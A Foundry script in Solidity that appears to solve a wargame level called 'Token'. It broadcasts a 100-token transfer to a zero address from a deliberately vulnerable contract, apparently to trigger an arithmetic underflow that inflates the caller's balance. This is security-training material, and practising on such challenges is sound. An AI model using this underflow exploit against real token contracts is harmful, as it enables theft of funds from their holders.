// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Level5TokenSolution is Script {
    Token public instance = Token(0xE6b4D2c6e352738951B9C85C129fdaC7CE776C3e);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("balance before: ", instance.balanceOf(vm.envAddress("MY_ADDRESS")));
        instance.transfer(vm.envAddress("ZERO_ADDRESS"), 100);
        console.log("balance after: ", instance.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
